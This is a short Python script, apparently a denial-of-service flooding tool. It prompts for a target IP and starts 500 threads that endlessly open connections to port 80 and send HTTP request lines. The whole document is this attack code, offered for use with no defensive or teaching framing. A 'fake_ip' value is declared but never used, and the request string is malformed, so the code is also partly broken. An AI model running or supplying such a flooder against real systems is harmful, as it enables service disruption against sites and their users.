import socket
import threading

target = str(input("Enter IP address of target: "))
fake_ip = "124.212.212.116"
port = 80
flag = True

def attack():
    while flag:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET/" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))

for i in range(500):
    thread = threading.Thread(target= attack)
    thread.start()
